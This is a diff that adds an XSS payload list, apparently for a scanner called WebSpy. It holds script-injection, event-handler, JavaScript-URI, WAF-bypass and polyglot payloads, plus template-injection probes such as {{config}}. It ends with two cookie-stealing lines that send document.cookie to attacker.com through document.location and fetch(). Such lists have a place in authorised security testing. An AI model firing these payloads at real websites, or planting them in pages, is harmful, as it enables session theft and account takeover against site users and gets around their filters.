@@ -1,0 +1,57 @@
+# WebSpy XSS Payload List
+# Author: Silentium Noctis
+# Format: one payload per line, lines starting with # are comments
+# Add your own payloads below
+
+# ── Basic Script Injection ──────────────────────────────────
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+
+# ── Event Handlers ───────────────────────────────────────────
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.domain)>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+
+# ── JavaScript URI ────────────────────────────────────────────
+javascript:alert(1)
+javascript:alert(document.domain)
+"><a href=javascript:alert(1)>click</a>
+
+# ── WAF Bypass Variants ───────────────────────────────────────
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert`1`</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+<svg><script>alert(1)</script></svg>
+<math><mtext></p><script>alert(1)</script>
+
+# ── SSTI (Template Injection) ─────────────────────────────────
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+{{config}}
+{{self.__dict__}}
+
+# ── Polyglot Payloads ─────────────────────────────────────────
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+"><<script>alert(1);//<</script>
+
+# ── Cookie Steal ─────────────────────────────────────────────
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
